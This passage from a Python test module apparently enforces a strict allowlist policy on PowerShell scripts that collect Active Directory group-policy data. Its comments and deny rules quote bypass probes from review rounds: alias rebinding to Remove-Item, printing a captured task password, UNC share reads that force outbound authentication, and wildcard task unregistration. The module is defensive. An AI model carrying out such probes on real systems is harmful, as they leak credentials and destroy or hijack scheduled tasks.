    _exact("commands", script, named - _cfset(local), _cfset(policy.commands))
    dynamic = {c["text"] for c in entry["commands"] if not c["name"]}
    _exact("dynamic invocations", script, dynamic, policy.dynamic_invocations)
    # Set-Variable / New-Variable / Set-Item / Tee-Object name a target in a
    # string the assignment AST cannot see; none are used, so forbid them.
    assert not entry["indirect_writes"], (
        f"{script}: indirect variable/item writes are not allowed: {entry['indirect_writes']}"
    )
    forbidden = sorted(named & _cfset(FORBIDDEN_COMMANDS))
    assert not forbidden, f"{script}: commands that are never allowed: {forbidden}"
    # A parameter token that binds to no real parameter of a known cmdlet (nor a
    # common parameter) errors at runtime; refuse it rather than treat it as
    # inert (DeepSeek round-5 NB-3: `Get-ChildItem -OutFile ...`).
    for command in entry["commands"]:
        if not command.get("cmdlet_known"):
            continue
        for arg in command["arguments"]:
            if arg["parameter"] and not arg.get("parameter_resolved", True):
                raise AssertionError(
                    f"{script}:{command['line']}: -{arg['parameter']} is not a parameter of "
                    f"{command['name']}"
                )
    # ForEach-Object may only run scriptblocks: `ForEach-Object Delete` /
    # `-MemberName Delete` invokes a method by name, invisible to the member
    # allowlist.
    for command in entry["commands"]:
        if command["name"] not in ("foreach-object", "%", "foreach"):
            continue
        for arg in command["arguments"]:
            param = arg["parameter"]
            if param is None:
                ok = arg["value_kind"] == "ScriptBlockExpressionAst"
            else:
                resolved = _resolve_param(
                    str(param), ["Begin", "Process", "End", "RemainingScripts"]
                )
                ok = resolved is not None and arg["value_kind"] == "ScriptBlockExpressionAst"
            assert ok, (
                f"{script}:{command['line']}: ForEach-Object must be given scriptblocks only "
                f"({_norm(command['text'])})"
            )


def check_dotnet(script: str, entry: dict[str, Any]) -> None:
    policy = POLICIES[script]
    members = entry["members"]
    dynamic = [m["text"] for m in members if m["dynamic_member"] or (m["static"] and not m["type"])]
    assert not dynamic, f"{script}: computed member/type names cannot be verified: {dynamic}"
    static = {_method_key(m["type"], m["member"]) for m in members if m["static"]}
    allowed_static = frozenset(_method_key(*k.split("::")) for k in policy.static_methods)
    _exact("static .NET methods", script, static, allowed_static)
    instance = {m["member"] for m in members if not m["static"]}
    _exact("instance .NET methods", script, instance, _cfset(policy.instance_methods))
    assigned = {a["target"] for a in entry["member_assignments"]}
    _exact("property assignments", script, assigned, policy.member_assignments)


def check_types(script: str, entry: dict[str, Any]) -> None:
    refs = list(entry["type_references"])
    for assignment in entry["member_assignments"]:
        refs += assignment.get("receiver_types", [])
    hits = sorted({t for t in refs if any(s in _cf(t) for s in _FORBIDDEN_TYPE_SUBSTRINGS)})
    assert not hits, f"{script}: forbidden .NET/COM/AD type reference: {hits}"


def check_instance_receivers(script: str, entry: dict[str, Any]) -> None:
    allowed = {_cf(k): v for k, v in INSTANCE_RECEIVERS.get(script, {}).items()}
    side_effecting = _cfset(_SIDE_EFFECTING_METHODS | _LIFETIME_METHODS)
    for member in entry["members"]:
        if member["static"]:
            continue
        name = member["member"]
        receiver_var = member["receiver_var"]
        if receiver_var is None:
            # No pinnable receiver variable. A side-effecting method on a
            # parenthesized/command result ((Get-Item x).Delete(), FileInfo
            # .CopyTo, [WMI]...Delete()) is rejected; a pure read/string method
            # (e.g. ($_ | Out-String).TrimEnd()) is fine (type denylist already
            # screened any type-literal receiver).
            assert name not in side_effecting, (
                f"{script}:{member['line']}: side-effecting method {name!r} on a non-variable "
                f"receiver {member['receiver']!r} (needs a pinned receiver variable)"
            )
            continue
        permitted = allowed.get(name, frozenset())
        assert receiver_var in permitted, (
            f"{script}:{member['line']}: instance method {name!r} called on unexpected receiver "
            f"${receiver_var} (allowed: {sorted(permitted)})"
        )


def _is_variable_param(arg: dict[str, Any]) -> bool:
    canon = arg.get("parameter_canonical")
    if canon:
        return _cf(canon) in _VARIABLE_WRITING_CANON
    return _cf(str(arg["parameter"])).endswith("variable")


# A variable-writing common parameter must name its target as a plain literal
# identifier (optionally `+` for append). A computed name (`('Output'+'Root')`,
# `$n`, `${OutputRoot}`) cannot be pinned, so it is refused (DeepSeek NEW-BL-3,
# NON-BL-2).
_LITERAL_VARIABLE_NAME = re.compile(r"^\+?[A-Za-z_][A-Za-z0-9_]*$")


def _common_param_writes(entry: dict[str, Any]) -> list[dict[str, Any]]:
    """Every -OutVariable/-ErrorVariable/... use: line, parameter, target, literal.

    These bind a variable with no assignment AST node (Sol BL-1). ``literal`` is
    true only for a bare identifier argument; ``target`` is the variable name it
    writes (``+`` stripped) or the raw text when it is not literal.
    """
    writes: list[dict[str, Any]] = []
    for command in entry["commands"]:
        for arg in command["arguments"]:
            if arg["parameter"] and _is_variable_param(arg):
                raw = _norm(arg["value"])
                literal = arg["value_kind"] == "StringConstantExpressionAst" and bool(
                    _LITERAL_VARIABLE_NAME.match(raw)
                )
                writes.append(
                    {
                        "line": command["line"],
                        "function": command["function"],
                        "parameter": str(arg["parameter"]),
                        "target": raw.lstrip("+") if literal else raw,
                        "literal": literal,
                    }
                )
    return writes


def check_usings(script: str, entry: dict[str, Any]) -> None:
    assert not entry["using_statements"], (
        f"{script}: `using` statements are not allowed "
        f"(assembly/module/namespace load): {[u['text'] for u in entry['using_statements']]}"
    )


def check_redirections(script: str, entry: dict[str, Any]) -> None:
    for redir in entry["redirections"]:
        if redir["kind"] == "merging":
            continue  # stream merge (e.g. *>&1); writes no file
        assert _norm(redir["location"]) == "$null", (
            f"{script}:{redir['line']}: file redirection must target $null, "
            f"not {redir['location']!r}"
        )


def check_new_object_and_add_type(script: str, entry: dict[str, Any]) -> None:
    policy = POLICIES[script]
    types: set[str] = set()
    assemblies: set[str] = set()
    definitions: set[str] = set()
    for command in entry["commands"]:
        bound = command["bound"]
        if command["name"] == "new-object":
            assert "comobject" not in bound, f"{script}:{command['line']}: COM is not allowed"
            types.add(_cf(str(bound.get("typename"))))
        elif command["name"] == "add-type":
            keys = set(bound) - {"erroraction"}
            if keys == {"assemblyname"}:
                assemblies.add(_cf(bound["assemblyname"]))
            elif keys == {"typedefinition"} and command["type_definition_sha256"]:
                definitions.add(command["type_definition_sha256"])
            else:
                # AssertionError (not pytest.fail) so _run_checks and the
                # generator report it as a check failure (Sol round-4 NB-3).
                raise AssertionError(
                    f"{script}:{command['line']}: unsupported Add-Type form {sorted(keys)}"
                )
    _exact("New-Object types", script, types, _cfset(policy.new_object_types))
    _exact("Add-Type assemblies", script, assemblies, _cfset(policy.add_type_assemblies))
    _exact("Add-Type inline definitions (sha256)", script, definitions, policy.add_type_definitions)


def _write_targets(entry: dict[str, Any]) -> list[tuple[int, str]]:
    targets: list[tuple[int, str]] = []
    for command in entry["commands"]:
        name = command["name"] or ""
        required = _WRITE_COMMANDS_CF.get(name)
        optional = _OPTIONAL_PATH_COMMANDS_CF.get(name)
        params = required or optional
        if params is None:
            continue
        bound = [command["bound"][p] for p in params if isinstance(command["bound"].get(p), str)]
        if not bound:
            if optional is not None:
                continue
            raise AssertionError(
                f"line {command['line']}: cannot resolve the write target of {command['text']}"
            )
        targets.extend((command["line"], text) for text in bound)
    for member in entry["members"]:
        if member["static"] and _method_key(member["type"], member["member"]) in _WRITE_STATIC_CF:
            targets.append((member["line"], member["first_argument"] or ""))
    return targets


def check_writes(script: str, entry: dict[str, Any]) -> None:
    roots = set(WRITE_ROOTS[script])
    assert roots <= set(PINNED_VARS[script]), (
        f"{script}: every write root must be pinned: {roots - set(PINNED_VARS[script])}"
    )
    pinned_targets = WRITE_TARGET_EXPRESSIONS[script]
    used: set[str] = set()
    for line, text in _write_targets(entry):
        norm = _norm(text)
        # Closed set: the write target must be exactly one of the pinned path
        # expressions. This refuses `Join-Path $root $childData`, a `$env:` or
        # `..` component, and any computed child (Sol BL-4); the anchoring root
        # is separately pinned (check_pinned_bindings).
        assert norm in pinned_targets, (
            f"{script}:{line}: write target {norm!r} is not a pinned path expression"
        )
        assert not _ABSOLUTE_LITERAL.search(norm), f"{script}:{line}: absolute/UNC/.. in {norm!r}"
        assert not _PROVIDER.search(norm), f"{script}:{line}: provider path in {norm!r}"
        used.add(norm)
    # New-Item must not create links, target a provider, or carry a -Name
    # component (another path segment, Sol BL-4), -Value or -Target path.
    for command in entry["commands"]:
        if command["name"] != "new-item":
            continue
        bound = command["bound"]
        item_type = _cf(str(bound.get("itemtype", "")))
        assert item_type not in _FORBIDDEN_ITEM_TYPES, (
            f"{script}:{command['line']}: New-Item -ItemType {bound.get('itemtype')} is not allowed"
        )
        assert "psprovider" not in bound, (
            f"{script}:{command['line']}: New-Item -PSProvider blocked"
        )
        assert "name" not in bound, (
            f"{script}:{command['line']}: New-Item -Name is a path component and is not allowed"
        )
        for key in ("value", "target"):
            value = bound.get(key)
            if isinstance(value, str):
                assert not _ABSOLUTE_LITERAL.search(value) and not _PROVIDER.search(value), (
                    f"{script}:{command['line']}: New-Item -{key} {value!r} escapes the roots"
                )
    _exact("write-target expressions", script, used, pinned_targets)


def check_pinned_bindings(script: str, inv: dict[str, dict[str, Any]]) -> None:
    """Every required variable (write roots, receivers, splats, exec/task inputs,
    and transitively everything their bindings read) is pinned, and each pinned
    variable's complete binding set equals the committed set exactly.

    A binding is any way the variable acquires a value (see the binding-key
    legend above), so a receiver rebind (`$entry = Get-Item <SYSVOL>`, Sol
    round-3 BL-2), a call-site argument to a local function's root parameter
    (`Write-GpoLensOwnerMarkerBytes -OutputRoot <SYSVOL>`), a `[ref]`, a `++`, a
    property/index write on a pinned object, or a variable-writing common
    parameter all change the set and fail.
    """
    pinned = PINNED_VARS[script]
    required = _required_vars(script, inv)
    unpinned = sorted(set(required) - set(pinned))
    assert not unpinned, f"{script}: variables must be pinned: " + "; ".join(
        f"${v} ({required[v]})" for v in unpinned
    )
    stale = sorted(set(pinned) - set(required))
    assert not stale, f"{script}: PINNED_VARS entries no longer required (remove them): {stale}"
    bindings = _all_bindings(script, inv)
    for var in sorted(pinned):
        actual = bindings.get(var, set())
        allowed = pinned[var]
        extra = sorted(actual - allowed)
        missing = sorted(allowed - actual)
        assert not extra, (
            f"{script}: ${var} has undocumented binding(s) {extra} "
            "(a confined write/exec/receiver variable cannot be rebound)"
        )
        assert not missing, f"{script}: stale pinned binding(s) for ${var}: {missing}"
        for key in actual:
            if key.startswith("foreach "):
                assert not _ABSOLUTE_LITERAL.search(key) and not _PROVIDER.search(key), (
                    f"{script}: foreach source for pinned ${var} carries an absolute/UNC/provider "
                    f"path: {key!r}"
                )
            elif key.startswith("param "):
                assert not _UNC_OR_DOTDOT.search(key) and not _PROVIDER.search(key), (
                    f"{script}: ${var} parameter default is an unsafe path: {key!r}"
                )
    _, unresolved = _call_site_bindings(script, inv)
    assert not unresolved, f"{script}: call-site arguments that bind no parameter: {unresolved}"


def check_bindings(script: str, entry: dict[str, Any]) -> None:
    """Assignment forms that cannot be pinned, or that rebind the engine.

    Refuses: a provider/drive or `$global:` assignment target (Sol round-3
    `${Alias:Get-Item} = 'Remove-Item'`, `$env:PSModulePath`, `${C:\\x}`); any
    write to an automatic/preference variable outside SPECIAL_BINDINGS; any
    reference to $PSDefaultParameterValues/$PSModuleAutoLoadingPreference/
    $ExecutionContext (DeepSeek NEW-BL-1); an index write outside
    INDEX_ASSIGNMENT_ROOTS; multiple assignment and other unpinnable left-hand
    sides; a drive-qualified variable read other than `$env:`; and a computed or
    unlisted variable-writing common-parameter target (DeepSeek NEW-BL-3).
    """
    others = [a["target"] for a in entry["other_assignments"]]
    assert not others, f"{script}: unpinnable assignment targets: {others}"
    specials: set[tuple[str, str]] = set()
    for binding in entry["variable_assignments"]:
        name = binding["name"]
        where = f"{script}:{binding['line']}"
        assert binding["is_variable"] and binding["qualifier"] in _ALLOWED_QUALIFIERS, (
            f"{where}: ${name} is a provider/drive or global-scope write ({binding['kind']})"
        )
        assert binding["kind"] != "multi", f"{where}: multiple assignment to ${name} is not allowed"
        bare = _bare_var(name)
        if bare == "null" and binding["kind"] == "assign" and binding["operator"] == "Equals":
            continue  # `$null = expr` discards output
        if bare in _SPECIAL_VARIABLES or bare.endswith("preference"):
            specials.add((bare, _binding_key(binding)))
    unexpected = sorted(specials - SPECIAL_BINDINGS[script])
    assert not unexpected, (
        f"{script}: writes to automatic/preference variables are not allowed: {unexpected}"
    )
    _exact("automatic/preference variable writes", script, specials, SPECIAL_BINDINGS[script])
    for ref in entry["variable_refs"]:
        bare = _bare_var(ref["name"])
        assert bare not in FORBIDDEN_VARIABLE_REFS, (
            f"{script}: ${ref['name']} may not be referenced"
        )
        assert ref["drive"] in ("", "env"), (
            f"{script}: provider-qualified variable ${{{ref['name']}}} is not allowed"
        )
    roots = {_cf(i["root_var"] or "") for i in entry["index_assignments"]}
    unexpected_roots = sorted(roots - INDEX_ASSIGNMENT_ROOTS[script])
    assert not unexpected_roots, (
        f"{script}: index writes on {unexpected_roots} are not allowed "
        f"({[i['target'] for i in entry['index_assignments']]})"
    )
    _exact("index-write roots", script, roots, INDEX_ASSIGNMENT_ROOTS[script])
    targets: set[str] = set()
    for write in _common_param_writes(entry):
        assert write["literal"], (
            f"{script}:{write['line']}: -{write['parameter']} target {write['target']!r} must be a "
            "literal variable name (a computed name cannot be pinned)"
        )
        targets.add(_bare_var(write["target"]))
    _exact(
        "variable-writing common-parameter targets", script, targets, COMMON_PARAM_TARGETS[script]
    )


def check_ast(script: str, entry: dict[str, Any]) -> None:
    """Whole-tree screens: every node type serializable and in the closed set;
    no `#Requires` (module auto-import, Sol round-3 BL-1); no background jobs or
    parallel foreach; ASCII source (Windows PowerShell 5.1 reads a BOM-less file
    as ANSI, so non-ASCII bytes could parse differently there than here)."""
    assert not entry["unsupported_nodes"], (
        f"{script}: AST nodes the serializer does not cover: {entry['unsupported_nodes']}"
    )
    extra = sorted(set(entry["node_types"]) - ALLOWED_NODE_TYPES)
    assert not extra, f"{script}: AST node types outside the closed set: {extra}"
    assert not entry["script_requirements"], f"{script}: #Requires is not allowed"
    assert not entry["background_pipelines"], (
        f"{script}: background jobs (`&`) are not allowed: {entry['background_pipelines']}"
    )
    for row in entry["ast_rows"]:
        if row[2] == "ForEachStatementAst":
            flags = dict(row[3]).get("Flags", "None")
            assert flags == "None", f"{script}: foreach -Parallel is not allowed"
    assert entry["source_non_ascii_bytes"] == 0, (
        f"{script}: source has {entry['source_non_ascii_bytes']} non-ASCII bytes"
    )
    # LF only (.gitattributes pins it): the golden digests exact bytes, and a CR
    # inside a multi-line literal would change that literal's value (Sol r4 NB-2).
    assert entry["source_cr_bytes"] == 0, (
        f"{script}: source has {entry['source_cr_bytes']} CR bytes (LF line endings only)"
    )


def check_local_functions(script: str, entry: dict[str, Any]) -> None:
    names = list(entry["functions"])
    assert len(names) == len(set(names)), f"{script}: a function is defined twice"
    expected = [_cf(n) for n in LOCAL_FUNCTIONS[script]]
    assert names == expected, (
        f"{script}: defined functions {names} differ from LOCAL_FUNCTIONS {expected}"
    )


def _function_body_digest(fn: dict[str, Any]) -> str:
    text = "\n".join(_ast_line(row) for row in fn["body_rows"])
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def check_local_function_bodies(script: str, entry: dict[str, Any]) -> None:
    """Every local function's whole normalized syntax tree is pinned by digest
    in LOCAL_FUNCTION_BODIES (hand-maintained; the generator never writes it).

    The dataflow pins see a helper's call expression, not what it returns or
    does: Sol round 4 changed Get-GpoLensCompletedExports to emit an outside-
    root FileInfo (into a pinned Remove-Item via the catch path) and
    ConvertTo-GpoLensTaskArgument to return a constant UNC `-File` target, with
    every pin unchanged. Any edit to a function body now needs a reviewed
    digest update here.
    """
    actual = {fn["name"]: _function_body_digest(fn) for fn in entry["function_params"]}
    allowed = {_cf(k): v for k, v in LOCAL_FUNCTION_BODIES[script].items()}
    changed = sorted(n for n in actual if n in allowed and actual[n] != allowed[n])
    assert not changed, (
        f"{script}: function bodies changed (review, then update LOCAL_FUNCTION_BODIES): "
        + ", ".join(f"{n} -> {actual[n]}" for n in changed)
    )
    _exact("pinned function bodies", script, set(actual), frozenset(allowed))


# EVERY command invocation (Sol round 5: extra calls of allowlisted read/output
# commands — `Write-Host "captured=$taskPassword"`, `Get-Item \\host\share\...` —
# were unpinned), plus every write/exec/lifetime .NET call, is pinned with its
# exact normalized text AND control-flow context (enclosing functions,
# conditions, loops, try/catch/finally, scriptblock arguments, and every
# preceding guard — an `if` that throws/returns, an `Assert-*` call, an exit
# statement) as a multiset. A new or duplicated call, a call moved outside its
# guard (Sol round-3 Unregister copy, round-4 NB-1 marker write), a guard moved
# after an operation, or a weakened guard condition changes the multiset.
# (Inside local functions the body digest pins the same calls again.)
_GUARDED_STATIC = frozenset(
    _method_key(*k.split("::"))
    for k in _WRITE_STATIC | {"IO.Compression.ZipFileExtensions::CreateEntryFromFile"}
)
_GUARDED_INSTANCE = _cfset(_SIDE_EFFECTING_METHODS | _LIFETIME_METHODS)


def _guarded_ops(script: str, inv: dict[str, dict[str, Any]]) -> list[tuple[str, tuple[str, ...]]]:
    entry = inv[script]
    ops: list[tuple[str, tuple[str, ...]]] = []
    for command in entry["commands"]:
        ops.append((_norm(command["text"]), tuple(_norm(c) for c in command["context"])))
    # EVERY .NET call (static and instance), by exact text and context — not only
    # write/lifetime methods. Sol round 7: a computed-UNC `IO.File::ReadAllBytes`
    # and an extra `$knownIds.Add(...)` were invisible when only a subset was
    # pinned and the rest compared as a name set.
    for member in entry["members"]:
        ops.append((_norm(member["text"]), tuple(_norm(c) for c in member["context"])))
    return ops


def check_guarded_ops(script: str, inv: dict[str, dict[str, Any]]) -> None:
    from collections import Counter

    actual = Counter(_guarded_ops(script, inv))
    allowed = Counter(GUARDED_OPS[script])
    extra = actual - allowed
    missing = allowed - actual
    assert not extra and not missing, (
        f"{script}: command invocations, write/exec operations or their guards changed.\n"
        + "".join(f"  unexpected: {op} @ {' > '.join(ctx)}\n" for op, ctx in sorted(extra))
        + "".join(f"  missing:    {op} @ {' > '.join(ctx)}\n" for op, ctx in sorted(missing))
    )


# Secret-bearing variables (Sol round 5): the service-account credential and the
# plaintext password extracted from it, plus anything assigned from them.
SECRET_VARIABLES: dict[str, frozenset[str]] = {
    "Export-GpoEstate.ps1": frozenset(),
    "Export-GroupMembers.ps1": frozenset({"credential"}),
    "Export-Principals.ps1": frozenset({"credential"}),
    "Run-GpoLensCollection.ps1": frozenset(),
    "GpoLensCollectionMarker.ps1": frozenset(),
    "Register-GpoLensCollection.ps1": frozenset({"credential", "taskpassword"}),
}
_ASSIGNED_ROOT = re.compile(
    r"^\$(?:script:|local:|private:)?([A-Za-z_][A-Za-z0-9_]*)[^=]*?(?:\+)?=(?!=)"
)


def _secret_variables(script: str, entry: dict[str, Any]) -> set[str]:
    """Seeds plus every variable a statement reading a secret assigns to
    (`$taskPassword = $Credential...`, `$adParams.Credential = $Credential`)."""
    secrets = set(SECRET_VARIABLES[script])
    changed = True
    while changed:
        changed = False
        for use in entry["variable_uses"]:
            if use["name"] not in secrets:
                continue
            match = _ASSIGNED_ROOT.match(use["statement"])
            if match and _cf(match.group(1)) not in secrets:
                secrets.add(_cf(match.group(1)))
                changed = True
    return secrets


def _secret_uses(script: str, entry: dict[str, Any]) -> list[tuple[str, str, str]]:
    secrets = _secret_variables(script, entry)
    return [
        (u["name"], u["function"], u["statement"])
        for u in entry["variable_uses"]
        if u["name"] in secrets
    ]


def check_secret_uses(script: str, entry: dict[str, Any]) -> None:
    """Every read or write of a secret-bearing variable is one of the committed
    uses (declaration, validation, GetNetworkCredential() extraction, the single
    Register-ScheduledTask -Password site, splatting into the AD reads, and
    clearing). Interpolation into a message, an argument to any other command,
    a pipeline, a member access or a copy to another variable is a new use and
    is refused."""
    from collections import Counter

    actual = Counter(_secret_uses(script, entry))
    allowed = Counter(SECRET_USES[script])
    extra = actual - allowed
    missing = allowed - actual
    assert not extra and not missing, (
        f"{script}: secret-variable uses changed.\n"
        + "".join(f"  unexpected: ${n} [{f or 'script'}] {st}\n" for n, f, st in sorted(extra))
        + "".join(f"  missing:    ${n} [{f or 'script'}] {st}\n" for n, f, st in sorted(missing))
    )


# A UNC / remote path (`\\host\share`, `//host/share`, `\\?\UNC\...`) in any
# command argument: a read of an attacker-addressed share also forces outbound
# authentication from the DC (Sol round 5). None are used; refuse all.
_REMOTE_PATH = re.compile(r"""(?:^|['"(\s])(?:\\\\|//)[^\\/\s'"]""")


def check_remote_paths(script: str, entry: dict[str, Any]) -> None:
    for command in entry["commands"]:
        for arg in command["arguments"]:
            value = arg["value"] or ""
            assert not _REMOTE_PATH.search(value), (
                f"{script}:{command['line']}: remote/UNC path in a command argument: {value!r}"
            )


# Remote-looking string literals anywhere in a script (UNC `\\host\share`,
# `//host/share`, `\\?\UNC\...`, device paths, URLs `scheme://`): a variable
# bound to one reaches commands whose text is pinned (Sol round 6). Only these
# exact literal values may occur (casefolded script -> values, with reasons).
_REMOTE_LITERAL = re.compile(r"(?:^|[\s'\"(,;=])(?:\\\\|//)\S|\b[A-Za-z][A-Za-z0-9+.-]+://")
REMOTE_LITERALS: dict[str, frozenset[str]] = {
    # The collector's one deliberate remote read: the domain's own SYSVOL
    # Policies share, built from the domain's DNS root (read-only copy source).
    "Export-GpoEstate.ps1": frozenset({"\\\\$($dom.DNSRoot)\\SYSVOL\\$($dom.DNSRoot)\\Policies"}),
    "Export-GroupMembers.ps1": frozenset(),
    "Export-Principals.ps1": frozenset(),
    "Run-GpoLensCollection.ps1": frozenset(),
    "GpoLensCollectionMarker.ps1": frozenset(),
    # A regex (double trailing backslashes in ConvertTo-GpoLensTaskArgument), not a path.
    "Register-GpoLensCollection.ps1": frozenset({"(\\\\+)$"}),
}


def _string_literals(entry: dict[str, Any]) -> list[str]:
    values: list[str] = []
    for row in entry["ast_rows"]:
        if row[2] in ("StringConstantExpressionAst", "ExpandableStringExpressionAst"):
            value = dict(row[3]).get("Value")
            if isinstance(value, str):
                values.append(value)
    return values


def check_remote_literals(script: str, entry: dict[str, Any]) -> None:
    found = {v for v in _string_literals(entry) if _REMOTE_LITERAL.search(v)}
    unexpected = sorted(found - REMOTE_LITERALS[script])
    assert not unexpected, f"{script}: remote/UNC/URL-looking string literals: {unexpected}"
    _exact("remote-looking literals", script, found, REMOTE_LITERALS[script])


# Every TaskName parameter of the task scripts carries this validator, so a
# wildcard (`*`, `?`, `[...]`), path or quote character can never reach
# Unregister-/Register-ScheduledTask (Sol round 5: `-TaskName '*' -Unregister`
# removed every matching task).
TASK_NAME_VALIDATOR = "[ValidatePattern('^[A-Za-z0-9][A-Za-z0-9 ._-]{0,199}$')]"
_TASK_NAME_SCRIPTS = ("Register-GpoLensCollection.ps1", "Run-GpoLensCollection.ps1")


def check_task_name_validator(script: str, entry: dict[str, Any]) -> None:
    if script not in _TASK_NAME_SCRIPTS:
        return
    decls = [d for d in entry["parameter_decls"] if d["name"] == "taskname"]
    assert decls, f"{script}: no TaskName parameter found"
    for decl in decls:
        assert TASK_NAME_VALIDATOR in decl["attributes"], (
            f"{script}: TaskName parameter of {decl['function'] or 'the script'} lacks "
            f"{TASK_NAME_VALIDATOR}: {decl['attributes']}"
        )


def _header_digest(entry: dict[str, Any]) -> str:
    text = "\n".join(_ast_line(row) for row in entry["header_rows"])
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def check_script_header(script: str, entry: dict[str, Any]) -> None:
    """The script's own attributes and param block ([CmdletBinding(Supports-
    ShouldProcess)], parameters, validators, defaults) are pinned by a hand-
    maintained digest: turning ShouldProcess off (Sol round 5) or dropping a
    validator is a reviewed edit."""
    actual = _header_digest(entry)
    assert actual == SCRIPT_HEADERS[script], (
        f"{script}: script attributes/param block changed (review, then update "
        f"SCRIPT_HEADERS): {actual}"
    )


def _pipeline_inputs(entry: dict[str, Any]) -> list[tuple[str, tuple[str, ...]]]:
    return [
        (_norm(pin["text"]), tuple(_norm(c) for c in pin["context"]))
        for pin in entry["pipeline_inputs"]
    ]


def check_pipeline_inputs(script: str, entry: dict[str, Any]) -> None:
    """Expression-valued pipeline inputs (a non-command element feeding a
    multi-element pipeline) pinned by exact text + context as a multiset. Sol
    round 7: `(@([pscustomobject]@{FullName=<UNC>}) + @(Get-ChildItem ...)) |
    ForEach-Object { Copy-Item ... }` added an object to the SYSVOL copy without
    changing any command text."""
    from collections import Counter

    actual = Counter(_pipeline_inputs(entry))
    allowed = Counter(PIPELINE_INPUTS[script])
    extra = actual - allowed
    missing = allowed - actual
    assert not extra and not missing, (
        f"{script}: pipeline input expressions changed.\n"
        + "".join(f"  unexpected: {t} @ {' > '.join(c)}\n" for t, c in sorted(extra))
        + "".join(f"  missing:    {t} @ {' > '.join(c)}\n" for t, c in sorted(missing))
    )


def _statements(entry: dict[str, Any]) -> list[dict[str, Any]]:
    """Every statement that is a direct child of a block body (the script's
    blocks, each function body, each scriptblock, each if/loop/try body), in
    pre-order, derived from the golden's own ``ast_rows``: a row whose role is
    ``Statements`` plus every following deeper row is that statement's subtree.
    The digest is over the same canonical lines the golden records (depth
    rebased to the statement), so it covers string contents and structure."""
    rows = entry["ast_rows"]
    out: list[dict[str, Any]] = []
    counts: dict[int, int] = {}
    chain: dict[int, int] = {}
    for i, row in enumerate(rows):
        depth = int(row[0])
        for d in [d for d in counts if d > depth]:
            del counts[d]
        for d in [d for d in chain if d >= depth]:
            del chain[d]
        if row[1] != "Statements":
            continue
        idx = counts.get(depth, 0)
        counts[depth] = idx + 1
        chain[depth] = idx
        j = i + 1
        while j < len(rows) and int(rows[j][0]) > depth:
            j += 1
        sub = [[int(r[0]) - depth, *r[1:]] for r in rows[i:j]]
        text = "\n".join(_ast_line(r) for r in sub)
        hint = next(
            (
                str(dict(r[3]).get("Value") or dict(r[3]).get("VariablePath") or "")
                for r in rows[i + 1 : j]
                if dict(r[3]).get("Value") or dict(r[3]).get("VariablePath")
            ),
            "",
        )
        out.append(
            {
                "seq": len(out),
                "path": "/".join(str(chain[d]) for d in sorted(chain)),
                "kind": row[2],
                "preview": hint,
                "digest": hashlib.sha256(text.encode("utf-8")).hexdigest(),
            }
        )
    return out


def check_statement_digests(script: str, entry: dict[str, Any]) -> None:
    """Structural floor: every statement of every block body (top-level and
    inside each function/scriptblock) is pinned by a digest of its normalized
    AST subtree in STATEMENT_DIGESTS (hand-maintained; the generator never
    writes it). Any statement added, removed or edited anywhere changes a digest
    or the key set, so a regeneration is refused until a human updates the
    table. The remaining semantic checks stay the floor that catches a harmful
    edit even when someone updates the digests."""
    stmts = _statements(entry)
    actual = {str(st["seq"]): st["digest"] for st in stmts}
    allowed = STATEMENT_DIGESTS[script]
    _exact("statements", script, set(actual), frozenset(allowed))
    changed = sorted((k for k in actual if k in allowed and actual[k] != allowed[k]), key=int)
    if changed:
        by_seq = {str(st["seq"]): st for st in stmts}
        detail = ", ".join(
            f"{k} ([{by_seq[k]['path']}] {by_seq[k]['kind']}: {by_seq[k]['preview'][:40]})"
            for k in changed
        )
        raise AssertionError(
            f"{script}: statement subtree(s) changed (review, update STATEMENT_DIGESTS): {detail}"
        )


def _arg_vector(command: dict[str, Any]) -> TaskVector:
    return frozenset(
        (
            _cf(str(a.get("parameter_canonical") or a["parameter"])),
            _norm(a["value"]) if a["value"] is not None else None,
        )
        for a in command["arguments"]
        if a["parameter"]
    )


def check_task_action(script: str, entry: dict[str, Any]) -> None:
    if script != _TASK_ACTION_SCRIPT:
        for command in entry["commands"]:
            assert command["name"] not in _TASK_VECTORS_CF, (
                f"{script}:{command['line']}: scheduled-task cmdlet outside the registration script"
            )
        return
    for command in entry["commands"]:
        vectors = _TASK_VECTORS_CF.get(command["name"] or "")
        if vectors is None:
            continue
        # The full argument vector must match one pinned vector exactly. An
        # extra -CimSession, a wildcard -TaskName, -RunLevel Highest, or any
        # other changed/added argument matches none and fails.
        actual = _arg_vector(command)
        assert actual in vectors, (
            f"{script}:{command['line']}: {command['name']} argument vector {sorted(actual)} "
            f"matches no pinned vector"
        )


# Named semantic checks, in run order. Each takes (script, entry); the two that
# also need the local function set are wrapped. The names are what the
# regression suite asserts against (NON-BL-3).
def _named_checks(local: set[str], inv: dict[str, dict[str, Any]]) -> dict[str, Any]:
    return {
        "ast": check_ast,
        "statement_digests": check_statement_digests,
        "pipeline_inputs": check_pipeline_inputs,
        "commands": lambda s, e: check_commands(s, e, local),
        "local_functions": check_local_functions,
        "local_function_bodies": check_local_function_bodies,
        "dotnet": check_dotnet,
        "types": check_types,
        "instance_receivers": check_instance_receivers,
        "usings": check_usings,
        "redirections": check_redirections,
        "new_object_and_add_type": check_new_object_and_add_type,
        "writes": check_writes,
        "bindings": check_bindings,
        "pinned_bindings": lambda s, e: check_pinned_bindings(s, inv),
        "task_action": check_task_action,
        "guarded_ops": lambda s, e: check_guarded_ops(s, inv),
        "secret_uses": check_secret_uses,
        "remote_paths": check_remote_paths,
        "remote_literals": check_remote_literals,
        "task_name_validator": check_task_name_validator,
        "script_header": check_script_header,
    }


def _run_checks(script: str, inv: dict[str, dict[str, Any]]) -> set[str]:
    """Run every semantic check; return the set of check names that raised.

    ``parse_errors`` is reported as the pseudo-check ``parse`` so the regression
    suite can require a *substantive* check (not a parse failure) to flag a probe.
    """
    policy = POLICIES[script]
    entry = inv[script]
    local = set(entry["functions"])
    for source in policy.dot_sources:
        local |= set(inv[source]["functions"])
    failed: set[str] = set()
    if entry["parse_errors"]:
        failed.add("parse")
    for check_name, fn in _named_checks(local, inv).items():
        try:
            fn(script, entry)
        except AssertionError:
            failed.add(check_name)
    return failed


def run_all_checks(script: str, inv: dict[str, dict[str, Any]]) -> None:
    entry = inv[script]
    assert entry["parse_errors"] == [], f"{script}: {entry['parse_errors']}"
    failed = {c for c in _run_checks(script, inv) if c != "parse"}
    assert not failed, f"{script}: checks failed: {sorted(failed)}"


# ---------------------------------------------------------------------------
# Closed-world golden inventory. For each in-scope script the committed file
